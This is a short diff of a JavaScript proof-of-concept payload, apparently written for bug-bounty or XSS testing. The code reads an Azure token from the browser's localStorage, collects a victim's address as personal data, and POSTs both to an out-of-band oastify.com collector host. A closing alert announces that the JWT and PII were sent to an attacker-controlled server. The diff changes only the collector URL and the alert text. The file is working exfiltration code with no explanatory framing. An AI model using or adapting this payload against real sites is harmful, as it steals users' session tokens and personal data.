@@ -1,6 +1,6 @@
 var victimAzureToken=localStorage.getItem('azure_token');
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://oxpeakb49l1hnme9naf9qmaqqhw8k18q.oastify.com", true);
+xhr.open("POST", "https://zil628d0wcjk7py00im8hw558wen2gq5.oastify.com", true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 xhr.onreadystatechange = function() {
@@ -28,7 +28,7 @@ xhr.onreadystatechange = function() {
     //get and send PII
     var reqBody = victimAddress;
     var xhrr = new XMLHttpRequest();
-    xhrr.open("POST", "https://oxpeakb49l1hnme9naf9qmaqqhw8k18q.oastify.com", true);
+    xhrr.open("POST", "https://zil628d0wcjk7py00im8hw558wen2gq5.oastify.com", true);
     xhrr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     var requestBody = reqBody;
     xhrr.send(requestBody);
@@ -45,7 +45,7 @@ xhr.send(requestBody);
 console.log(victimAzureToken)
 console.log(requestBody)
 
-alert("ALL DONE - JWT AND PII SENT TO ATTACKER CONTROLLED SERVER - Please check console log for reference")
+alert("ALL DONE - JWT AND PII SENT TO ATTACKER CONTROLLED SERVER - Please click OK and check console log for reference")
 
 
 
